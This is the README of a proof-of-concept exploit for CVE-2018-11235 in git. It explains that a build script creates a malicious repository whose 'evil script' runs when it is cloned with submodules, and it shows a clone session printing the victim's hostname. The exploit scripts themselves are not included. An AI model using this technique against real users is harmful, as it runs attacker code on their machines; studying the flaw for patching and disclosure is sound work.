PoC exploit for CVE-2018-11235
==============================

GitHub is not allowing me to push a repository exploiting the vulnerability
(good point for them), so you will have to build it yourself by running the
[build.sh](build.sh) script.

Then, push the repository somewhere. When you clone it with the
`--recurse-submodules` flag, the [evil script](evil.sh) is executed:

```
$ git clone --recurse-submodules repo dest_dir
Cloning into 'dest_dir'...
done.
Submodule 'Spoon-Knife' (https://github.com/octocat/Spoon-Knife) registered for path 'Spoon-Knife'
Submodule '../../modules/evil' (https://github.com/octocat/Spoon-Knife) registered for path 'evil'
Cloning into '/snip/dest_dir/Spoon-Knife'...
Submodule path 'Spoon-Knife': checked out 'd0dd1f61b33d64e29d8bc1372a94ef6a2fee76a9'

Here is your hostname: snip

Submodule path 'evil': checked out 'd0dd1f61b33d64e29d8bc1372a94ef6a2fee76a9'
```


Acknowledgements
----------------

Code derived from [@peff](https://github.com/peff)'s [git patch][] (look for
the `t/t7415-submodule-names.sh` test file).

As such, this repository is published under the GNU General Public License
version 2.

Additional fix for older versions of git courtesy of
[@atorralba](https://github.com/atorralba)
([details in this post](https://atorralba.github.io/CVE-2018-11235/)).

[git patch]: https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44
